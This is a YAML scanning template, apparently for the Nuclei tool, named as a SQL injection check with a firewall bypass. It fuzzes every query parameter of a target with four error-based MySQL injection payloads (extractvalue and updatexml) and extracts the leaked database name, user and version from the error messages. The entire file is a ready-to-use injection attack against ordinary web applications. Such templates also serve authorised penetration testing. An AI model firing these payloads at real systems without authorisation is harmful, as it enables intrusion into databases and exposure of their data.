id: Nawab_Sqli

info:
  name: Nawab-Validated-SQLi-WAF-Bypass
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      sqli_payloads:
        - "1' AND (extractvalue(1,concat(0x7e,(SELECT database()),0x7e)))--"
        - "1\" AND (extractvalue(1,concat(0x7e,(SELECT user()),0x7e)))--"
        - "1' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1))--"
        - "1' AND 1=(SELECT 1 FROM (SELECT(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))))x)--"

    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{sqli_payloads}}"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "XPATH syntax error: '~[a-zA-Z0-9_\\-]+~'"

      - type: status
        status:
          - 200
          - 500

    extractors:
      - type: regex
        name: FOUND_SQLI_EXPOSED_DATA
        part: body
        regex:
          - "~[a-zA-Z0-9_\\-]+~"
